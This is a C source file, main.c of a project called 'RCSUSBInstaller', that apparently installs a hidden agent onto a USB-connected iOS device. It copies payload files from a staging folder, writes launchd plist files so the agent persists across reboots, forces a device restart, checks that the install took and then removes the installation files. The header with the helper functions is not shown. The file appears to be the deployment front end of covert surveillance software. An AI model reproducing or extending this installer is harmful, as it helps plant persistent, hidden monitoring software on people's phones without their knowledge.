//
//  main.c
//  RCSUSBInstaller
//
//  Created by armored on 2/6/13.
//  Copyright (c) 2013 armored. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include "RCSIosUsbSupport.h"

int main(int argc, const char * argv[])
{
  printf("start installation...\n");
  
  char **dir_content = list_dir_content("C:\\tmp\\ios");
  
  if (dir_content[0] == NULL)
  {
    printf("cannot found installation dir!\n");
    return 0;
  }
  
  if (make_install_directory() != 0)
  {
    printf("cannot create installer folder\n");
	return 0;
  }

  printf("copying files...\n");

  if (copy_install_files("C:\\tmp\\ios", dir_content) != 0)
  {
    printf("cannot copy files in installer folder\n");
	return 0;
  }

  printf("copying files... done!\n");

  if (create_launchd_plist() != 0)
  {
   printf("cannot create plist files\n");
   return 0;
  }

  printf("try to restart device...\n");

  if (restart_device() == 1)
  {
    printf("try to restart device...restarting\n");
  }
  else 
  {
	printf("can't restart device: try it manually!\n");
  }

  Sleep(1);

  int isDeviceOn = 0;

  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    Sleep(1);
  
  } while(isDeviceOn == 1);

  // Wait for device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    Sleep(1);
  
  } while(isDeviceOn == 0);

  printf("device connected\n");
  
	
  printf("checking installation...\n");

  if (check_installation(10, 10) == 1)
  {
	printf("installation done!\n");
    
	if (remove_installation() == 0)
		printf("cannot remove installation file!\n");
  }
  else
  {
	printf("installation failed: please retry!\n");
  }
  
  return 0;
}

